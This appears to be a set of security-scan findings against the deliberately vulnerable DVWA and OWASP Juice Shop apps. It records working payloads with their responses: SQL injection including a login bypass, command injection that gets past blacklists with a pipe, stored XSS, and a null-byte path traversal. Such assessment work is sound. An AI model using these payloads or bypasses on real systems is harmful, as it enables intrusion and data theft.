findings.title: SQL Injection in DVWA SQLi page via unsanitized 'id' parameter (low security)
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records, dumping the entire users table: Surname values observed = admin, Brown, Me, Picasso, Smith (First names: admin, Gordon, Hack, Pablo, Bob). FALSE payload id=1' AND '1'='2 returned zero records (page body only shows 'User ID:' with no ID/First name/Surname rows). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based SQL injection.

findings.title: OS Command Injection in DVWA Command Injection page via 'ip' parameter (low security)
findings.response_evidence: [security=low] Response body contains full ping output for 127.0.0.1 followed by the injected command's output 'www-data' appended directly after the ping statistics block: '...rtt min/avg/max/mdev = 0.021/0.024/0.028/0.002 ms\nwww-data'. This confirms the ip field is passed unsanitized to a shell command, allowing injection of the chained 'whoami' command which discloses the web server process identity (www-data).

findings.title: Stored XSS in DVWA Guestbook (xss_s) via 'mtxMessage' field (low security)
request_sequence: [security=low] POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] After submission, the guestbook page listing shows a new entry 'Name: tester' (message rendered as empty text because it was parsed as a script element rather than visible text), indicating the payload was stored and embedded as raw HTML/script rather than being encoded.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned 1 after navigating to http://dvwa/vulnerabilities/xss_s/ as dvwa_admin, proving the injected <script id="test_token">window.xss_flag=1</script> executed in the page's JS context. browser_read_dom('#test_token') confirmed the element exists in the DOM with inner_text/inner_html 'window.xss_flag=1'.

findings.title: DVWA Medium SQL Injection via numeric boolean payload in POST id field
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned 5 user records: (ID:1 OR 1=1, First name: admin, Surname: admin), (Gordon, Brown), (Hack, Me), (Pablo, Picasso), (Bob, Smith). FALSE payload id=1 AND 1=2 returned zero records (page only shows the User ID dropdown and no pre-formatted result blocks). This confirms the numeric boolean-based SQLi bypasses the quote-escaping defense present at medium security, since the id parameter is concatenated unsanitized into the SQL query when no quotes are used.

findings.title: DVWA Medium OS Command Injection via pipe bypass of ';'/'&&' blacklist
findings.response_evidence: [security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which blocks ';' and '&&' substrings) by using a bare pipe character. The response's command output <pre> block contained exactly 'www-data', confirming execution of the injected whoami command under the web server process identity.

findings.title: SQL Injection via session-input.php out-of-band ID parameter [security=high]
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # stored via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records: (ID: admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — confirming the backend query became `... WHERE user_id = '1' OR '1'='1' #' LIMIT 1`-style injection bypassing the LIMIT 1 trailing clause via comment. FALSE payload 1' AND '1'='2' # stored next, and the subsequent GET /vulnerabilities/sqli/ returned zero result rows (only the 'Click here to change your ID' prompt, no pre-block records) proving the condition is evaluated server-side and injectable. This confirms classic boolean-based SQLi at DVWA high security level via the out-of-band session-input.php vector requiring a trailing comment due to appended LIMIT 1.

findings.title: OS Command Injection via pipe (no trailing space) bypassing high-security blacklist [security=high]
findings.response_evidence: [security=high] Submitted ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which filters '; ', '| ' (pipe+space), and '&&'). Response page rendered inside the <pre> output block: \"www-data\" appended directly after the (empty/failed) ping output, i.e. visible_text contained \"Enter an IP address: www-data\" and pre_blocks=[\"www-data\"]. This confirms the injected `whoami` command executed server-side under the web process identity www-data, verifying OS command injection at DVWA high security level.

findings.title: Cross-User Basket Access (BOLA) - juiceshop_acct2 can read juiceshop_acct1's basket
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200, confirms own_basket_id=6, UserId=22, Product='Apple Juice (1000ml)' qty=3, BasketItem id=9

GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2, own_basket_id=7, Bearer token for acct2) -> 200, returns the SAME basket id=6 belonging to UserId=22 (acct1) with identical Product='Apple Juice (1000ml)' qty=3
findings.response_evidence: acct1 request confirmed basket 6 = {id:6, UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{quantity:3, id:9}}]}. acct2 (own_basket_id=7, authenticated with its own distinct Bearer token) issued GET /rest/basket/6 and received HTTP 200 with the identical response body: {id:6, UserId:22, Products:[{name:'Apple Juice (1000ml)', BasketItem:{quantity:3, id:9}}]} - i.e., acct2 successfully retrieved acct1's distinct seeded basket item (Apple Juice 1000ml, quantity 3) despite not owning basket 6. No 403/ownership check was enforced, confirming BOLA.

findings.title: Authentication Bypass via SQL Injection on /rest/user/login
findings.response_evidence: Response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload ' OR 1=1-- caused the backend SQL WHERE clause to match the first user record (lowest id) regardless of password, returning a valid authentication JWT with umail=admin@juice-sh.op, confirming SQLi-based authentication bypass as the first seeded admin account.

findings.title: SQL Injection in Product Search (error-based + UNION-based)
findings.response_evidence: First request with unescaped single quote q=qwert' returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error' confirming the q parameter is concatenated unsanitized into a raw SQL query. Second request with 9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with injected literal result set: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} - the returned 'product' record consists of the literal integers 1-9 supplied in the UNION SELECT, proving successful injection of attacker-controlled data into the query result.

findings.title: Open Directory Listing on /ftp/ Exposes Confidential Acquisitions Memo
findings.response_evidence:
Step 1: GET /ftp/ with Accept: text/html,application/json returned HTTP 200 with a serve-index directory listing (visible_text: 'listing directory /ftp/ ~ / ftp /') enumerating files including 'acquisitions.md 909 12/19/2023 1:12:12 PM', alongside quarantine/, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml — confirming the directory is unauthenticated and browsable.

Step 2: GET /ftp/acquisitions.md (unauth) returned HTTP 200, content_type text/markdown, with body: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This is the confidential acquisition memo explicitly marked 'confidential, do not distribute', retrievable without any authentication — confirming CWE-200 (unintended information disclosure via open directory listing).

findings.title: Unauthenticated Access to /api/Feedbacks Discloses User PII (emails linked to UserId)
request_sequence: GET http://juiceshop:3000/api/Feedbacks HTTP/1.1  (session=unauth, no Authorization header)
findings.response_evidence:
Request was sent with the unauthenticated session (no Authorization/Bearer token). Response: HTTP 200, application/json, status:'success', data array containing full feedback records: {\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"rating\":5,...}, {\"UserId\":2,...\"(***@juice-sh.op)\"...}, {\"UserId\":3,...\"(***der@juice-sh.op)\"...}, {\"UserId\":21,...\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\"...}.
No authentication was required to retrieve this endpoint, yet it returns per-user feedback records with UserId foreign keys directly linked to identifiable email-address fragments/domains embedded in the comment text (recognizable juice-sh.op email PII, e.g. partial local-parts '***in', '***der', '***ereum' at domain juice-sh.op) plus a leaked wallet seed phrase for UserId 21. This confirms unauthenticated disclosure of PII/sensitive personal data (CWE-359) since normal users should not be able to enumerate other accounts' feedback/PII without authorization.

findings.title: Poison Null-Byte Path Traversal bypasses /ftp/ extension filter
findings.response_evidence: Direct request to /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() at line 55, confirming the extension blacklist filter is active on the raw .bak path. Appending a URL-encoded null byte plus an allowed extension, GET /ftp/package.json.bak%2500.md, returned HTTP 200 with content_type application/octet-stream and the body was the actual package.json.bak file content (verified: '\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\" ...' full package.json structure), proving the null-byte truncation bypasses the verify() extension check and serves the restricted backup file.

findings.title: Exposed Encryption Keys Directory Listing
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a serve-index directory listing page. visible_text confirmed: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links to both /encryptionkeys/jwt.pub and /encryptionkeys/premium.key were present, confirming the directory is browsable without authentication and exposes sensitive key material filenames (JWT public key and premium feature encryption key).
